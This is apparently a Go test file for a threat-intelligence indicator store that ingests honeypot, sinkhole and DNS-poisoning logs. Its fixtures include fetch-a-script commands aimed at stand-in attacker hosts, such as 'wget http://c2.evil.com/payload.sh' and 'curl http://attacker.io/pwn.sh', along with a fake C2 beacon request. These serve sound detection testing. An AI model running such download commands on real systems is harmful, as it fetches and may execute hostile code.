package forensic

import (
	"bytes"
	"strings"
	"testing"
	"time"
)

// --- Store tests ---

func TestStore_AddDedupesAndUpdatesLastSeen(t *testing.T) {
	s := NewStore()
	t0 := time.Unix(1700000000, 0).UTC()
	a := s.Add(Observation{Kind: KindDomain, Value: "c2.evil.com", At: t0, Origin: "sinkhole"})
	b := s.Add(Observation{Kind: KindDomain, Value: "c2.evil.com", At: t0.Add(time.Hour), Origin: "dnspoison"})
	// Add returns snapshots, not the live pointer (P-RF.9e race fix).
	// Verify dedup via the Store's Get() which sees the merged state.
	if a.Value != b.Value {
		t.Fatalf("Values diverged: a=%+v b=%+v", a, b)
	}
	if b.Count != 2 {
		t.Fatalf("Count=%d want 2", b.Count)
	}
	if !b.LastSeen.Equal(t0.Add(time.Hour)) {
		t.Fatalf("LastSeen=%v want %v", b.LastSeen, t0.Add(time.Hour))
	}
	if len(b.Origins) != 2 {
		t.Fatalf("Origins=%v want both", b.Origins)
	}
}

func TestStore_CanonicalizesDomains(t *testing.T) {
	s := NewStore()
	s.Add(Observation{Kind: KindDomain, Value: "C2.Evil.Com."})
	s.Add(Observation{Kind: KindDomain, Value: "c2.evil.com"})
	if s.Len() != 1 {
		t.Fatalf("expected 1 IOC after canonicalization, got %d", s.Len())
	}
	if got := s.Get(KindDomain, "c2.evil.com"); got == nil || got.Count != 2 {
		t.Fatalf("get-after-canon failed: %+v", got)
	}
}

func TestStore_ConfidenceUpgradeOnly(t *testing.T) {
	s := NewStore()
	s.Add(Observation{Kind: KindDomain, Value: "x.com", Confidence: ConfidenceLow})
	s.Add(Observation{Kind: KindDomain, Value: "x.com", Confidence: ConfidenceHigh})
	s.Add(Observation{Kind: KindDomain, Value: "x.com", Confidence: ConfidenceMedium})

	ioc := s.Get(KindDomain, "x.com")
	if ioc.Confidence != ConfidenceHigh {
		t.Fatalf("Confidence=%q want high (upgrade-only)", ioc.Confidence)
	}
}

func TestStore_EmptyValueRejected(t *testing.T) {
	s := NewStore()
	if ioc := s.Add(Observation{Kind: KindDomain, Value: ""}); ioc != nil {
		t.Fatal("empty value should be rejected")
	}
	if ioc := s.Add(Observation{Kind: "", Value: "x"}); ioc != nil {
		t.Fatal("empty kind should be rejected")
	}
}

func TestStore_Tag(t *testing.T) {
	s := NewStore()
	s.Add(Observation{Kind: KindDomain, Value: "c2.evil.com"})
	s.Tag(KindDomain, "c2.evil.com", "cobalt-strike")
	s.Tag(KindDomain, "c2.evil.com", "cobalt-strike") // dup
	ioc := s.Get(KindDomain, "c2.evil.com")
	if len(ioc.Tags) != 1 || ioc.Tags[0] != "cobalt-strike" {
		t.Fatalf("Tags=%v", ioc.Tags)
	}
}

func TestStore_QueryFiltersByKindOriginConfidenceSince(t *testing.T) {
	s := NewStore()
	t0 := time.Unix(1700000000, 0).UTC()
	s.Add(Observation{Kind: KindDomain, Value: "old.com", At: t0, Origin: "sinkhole", Confidence: ConfidenceLow})
	s.Add(Observation{Kind: KindDomain, Value: "new.com", At: t0.Add(time.Hour), Origin: "honeysh", Confidence: ConfidenceHigh})
	s.Add(Observation{Kind: KindURL, Value: "http://x.com/y", At: t0, Origin: "honeysh", Confidence: ConfidenceHigh})

	// Kind filter
	if got := s.Query(Query{Kinds: []Kind{KindURL}}); len(got) != 1 || got[0].Value != "http://x.com/y" {
		t.Fatalf("kind filter wrong: %+v", got)
	}
	// Confidence ≥ high
	if got := s.Query(Query{Confidence: ConfidenceHigh}); len(got) != 2 {
		t.Fatalf("confidence filter wrong: got %d want 2", len(got))
	}
	// Origin
	if got := s.Query(Query{Origin: "sinkhole"}); len(got) != 1 || got[0].Value != "old.com" {
		t.Fatalf("origin filter wrong: %+v", got)
	}
	// Since
	if got := s.Query(Query{Since: t0.Add(30 * time.Minute)}); len(got) != 1 || got[0].Value != "new.com" {
		t.Fatalf("since filter wrong: %+v", got)
	}
	// Sorted descending by LastSeen
	got := s.Query(Query{})
	if len(got) != 3 || got[0].Value != "new.com" {
		t.Fatalf("sort order wrong: %+v", got)
	}
}

func TestStore_BoundedEvictsOldest(t *testing.T) {
	s := NewStoreWithCap(3)
	for i := 0; i < 5; i++ {
		s.Add(Observation{Kind: KindDomain, Value: "d" + string(rune('a'+i)) + ".com"})
	}
	if s.Len() != 3 {
		t.Fatalf("Len=%d want 3 (bounded)", s.Len())
	}
}

func TestStore_MaxSourcesPerIOC(t *testing.T) {
	s := NewStore()
	for i := 0; i < MaxSourcesPerIOC+10; i++ {
		s.Add(Observation{Kind: KindDomain, Value: "x.com", Source: string(rune('A' + i%26)) + itoa(i)})
	}
	ioc := s.Get(KindDomain, "x.com")
	if len(ioc.Sources) > MaxSourcesPerIOC {
		t.Fatalf("Sources len=%d > cap %d", len(ioc.Sources), MaxSourcesPerIOC)
	}
}

// --- Extract from text ---

func TestExtractFromText_URLsAndHosts(t *testing.T) {
	now := time.Unix(1700000000, 0).UTC()
	obs := ExtractFromText("attacker ran wget http://c2.evil.com/payload.sh", "honeysh", "sess1", now)

	// Push through a Store so dedup is applied — same as the
	// production path.
	s := NewStore()
	for _, o := range obs {
		s.Add(o)
	}
	if s.Get(KindURL, "http://c2.evil.com/payload.sh") == nil {
		t.Fatalf("URL not extracted: %+v", obs)
	}
	if s.Get(KindDomain, "c2.evil.com") == nil {
		t.Fatalf("domain from URL not extracted: %+v", obs)
	}
	// payload.sh must NOT be classified as a domain (it's a script).
	if ioc := s.Get(KindDomain, "payload.sh"); ioc != nil {
		t.Fatalf("script filename should not be a domain: %+v", ioc)
	}
}

func TestExtractFromText_ExtractsIPsButFiltersLocal(t *testing.T) {
	now := time.Unix(1700000000, 0).UTC()
	obs := ExtractFromText("connect 1.2.3.4 then 127.0.0.1 0.0.0.0", "x", "y", now)
	ips := byKind(obs, KindIPv4)
	if len(ips) != 1 || ips[0].Value != "1.2.3.4" {
		t.Fatalf("IPs wrong: %+v", ips)
	}
}

func TestExtractFromText_FiltersLibFragments(t *testing.T) {
	now := time.Unix(1700000000, 0).UTC()
	obs := ExtractFromText("loaded libfoo.so.6 from /usr/lib", "x", "y", now)
	doms := byKind(obs, KindDomain)
	for _, d := range doms {
		if strings.Contains(d.Value, ".so") {
			t.Errorf("filter should drop *.so: got %q", d.Value)
		}
	}
}

func TestExtractFromText_AKIA(t *testing.T) {
	now := time.Unix(1700000000, 0).UTC()
	obs := ExtractFromText("aws creds AKIAIOSFODNN7EXAMPLE found", "x", "y", now)
	keys := byKind(obs, KindAWSKey)
	if len(keys) != 1 || keys[0].Value != "AKIAIOSFODNN7EXAMPLE" {
		t.Fatalf("AKIA not extracted: %+v", keys)
	}
}

func TestExtractFromText_SHA256(t *testing.T) {
	now := time.Unix(1700000000, 0).UTC()
	hash := "a3b6c2e9d5f1085c4d8e7f2b9c4a1d6e3f7a8b5c2e9d6f3a1b8c5e2d9f6a3b1c"
	obs := ExtractFromText("hash="+hash, "x", "y", now)
	hashes := byKind(obs, KindSHA256)
	if len(hashes) != 1 || hashes[0].Value != hash {
		t.Fatalf("SHA256 not extracted: %+v", hashes)
	}
}

// --- Ingest pipeline ---

func TestProcessLine_HoneyShCommand(t *testing.T) {
	s := NewStore()
	line := `{"type":"command","body":{"session_id":"sess123","at":"2026-05-20T10:00:00Z","raw":"curl http://attacker.io/pwn.sh","command":"curl","urls":["http://attacker.io/pwn.sh"],"domains":["attacker.io"]}}`
	added, err := ProcessLine(s, []byte(line))
	if err != nil {
		t.Fatal(err)
	}
	if added == 0 {
		t.Fatal("expected new IOCs")
	}
	if s.Get(KindURL, "http://attacker.io/pwn.sh") == nil {
		t.Fatal("URL not added")
	}
	if s.Get(KindDomain, "attacker.io") == nil {
		t.Fatal("Domain not added")
	}
	if s.Get(KindCommand, "curl") == nil {
		t.Fatal("Command not added")
	}
}

func TestProcessLine_SinkholeBeacon(t *testing.T) {
	s := NewStore()
	startLine := `{"type":"beacon_start","body":{"beacon_id":"b1","started_at":"2026-05-20T10:00:00Z","peer_addr":"203.0.113.7:51000","sni":"c2.attacker.com","ja3":"771,4865-4866,0-23-65281,29-23-24,0","ja3_hash":"e7d705a3286e19ea42f587b344ee6865"}}`
	dataLine := `{"type":"beacon_data","body":{"beacon_id":"b1","at":"2026-05-20T10:00:01Z","payload":"GET /beacon HTTP/1.1\r\nHost: c2.attacker.com\r\nUser-Agent: BadMalware/1.0\r\n\r\n","is_text":true,"sha256":"abcd","http_host":"c2.attacker.com","http_path":"/beacon","user_agent":"BadMalware/1.0"}}`

	if _, err := ProcessLine(s, []byte(startLine)); err != nil {
		t.Fatal(err)
	}
	if _, err := ProcessLine(s, []byte(dataLine)); err != nil {
		t.Fatal(err)
	}

	if s.Get(KindIPv4, "203.0.113.7") == nil {
		t.Fatal("peer IP not extracted")
	}
	if s.Get(KindDomain, "c2.attacker.com") == nil {
		t.Fatal("SNI/host not extracted")
	}
	if s.Get(KindJA3, "e7d705a3286e19ea42f587b344ee6865") == nil {
		t.Fatal("JA3 hash not extracted")
	}
	if s.Get(KindUserAgent, "BadMalware/1.0") == nil {
		t.Fatal("user-agent not extracted")
	}
	if s.Get(KindBeaconHost, "c2.attacker.com") == nil {
		t.Fatal("beacon host not extracted")
	}
}

func TestProcessLine_DNSPoison(t *testing.T) {
	s := NewStore()
	line := `{"type":"dns_poison","body":{"at":"2026-05-20T10:00:00Z","peer":"127.0.0.1:55555","name":"login.evilcorp.com","qtype":1,"match":"known_bad","sink_ip":"127.0.0.1"}}`
	_, err := ProcessLine(s, []byte(line))
	if err != nil {
		t.Fatal(err)
	}
	ioc := s.Get(KindDomain, "login.evilcorp.com")
	if ioc == nil {
		t.Fatal("domain not added from dns_poison")
	}
	if ioc.Confidence != ConfidenceDeterministic {
		t.Fatalf("known_bad should be deterministic, got %q", ioc.Confidence)
	}
}

func TestProcessLine_DNSPoison_DGAIsMediumConfidence(t *testing.T) {
	s := NewStore()
	line := `{"type":"dns_poison","body":{"at":"2026-05-20T10:00:00Z","peer":"127.0.0.1:55555","name":"kx9vqzm7nbwt.com","qtype":1,"match":"dga_heuristic","sink_ip":"127.0.0.1"}}`
	_, _ = ProcessLine(s, []byte(line))
	ioc := s.Get(KindDomain, "kx9vqzm7nbwt.com")
	if ioc == nil || ioc.Confidence != ConfidenceMedium {
		t.Fatalf("DGA match should be medium-confidence: %+v", ioc)
	}
}

func TestProcessLine_UnknownTypeIgnored(t *testing.T) {
	s := NewStore()
	line := `{"type":"future_kind","body":{}}`
	added, err := ProcessLine(s, []byte(line))
	if err != nil {
		t.Fatal(err)
	}
	if added != 0 || s.Len() != 0 {
		t.Fatal("unknown type should be no-op")
	}
}

func TestProcessLine_MalformedJSON(t *testing.T) {
	s := NewStore()
	_, err := ProcessLine(s, []byte("not json"))
	if err == nil {
		t.Fatal("malformed JSON should return error")
	}
}

func TestProcessReader_FullStream(t *testing.T) {
	s := NewStore()
	stream := strings.Join([]string{
		`{"type":"command","body":{"session_id":"s1","at":"2026-05-20T10:00:00Z","raw":"id","command":"id"}}`,
		`{"type":"command","body":{"session_id":"s1","at":"2026-05-20T10:00:01Z","raw":"curl http://attacker.io","command":"curl","urls":["http://attacker.io"]}}`,
		`{"type":"dns_poison","body":{"at":"2026-05-20T10:00:02Z","name":"evil.example.com","qtype":1,"match":"known_bad"}}`,
		``,
		`not-json`,
	}, "\n")

	var errs int
	added := ProcessReader(s, strings.NewReader(stream), func(_ []byte, _ error) { errs++ })
	if added < 2 {
		t.Fatalf("expected several IOCs added, got %d", added)
	}
	if errs != 1 {
		t.Fatalf("expected 1 parse error, got %d", errs)
	}
	if s.Get(KindDomain, "evil.example.com") == nil {
		t.Fatal("domain not added")
	}
	if s.Get(KindCommand, "id") == nil {
		t.Fatal("command id not added")
	}
}

func TestProcessReader_ScalesToManyLines(t *testing.T) {
	s := NewStore()
	var buf bytes.Buffer
	for i := 0; i < 1000; i++ {
		buf.WriteString(`{"type":"dns_poison","body":{"at":"2026-05-20T10:00:00Z","name":"d` + itoa(i) + `.attacker.com","qtype":1,"match":"known_bad"}}`)
		buf.WriteByte('\n')
	}
	_ = ProcessReader(s, &buf, nil)
	if s.Len() != 1000 {
		t.Fatalf("Len=%d want 1000", s.Len())
	}
}

// --- helpers ---

func byKind(obs []Observation, k Kind) []Observation {
	var out []Observation
	for _, o := range obs {
		if o.Kind == k {
			out = append(out, o)
		}
	}
	return out
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	neg := n < 0
	if neg {
		n = -n
	}
	var buf [12]byte
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	if neg {
		i--
		buf[i] = '-'
	}
	return string(buf[i:])
}
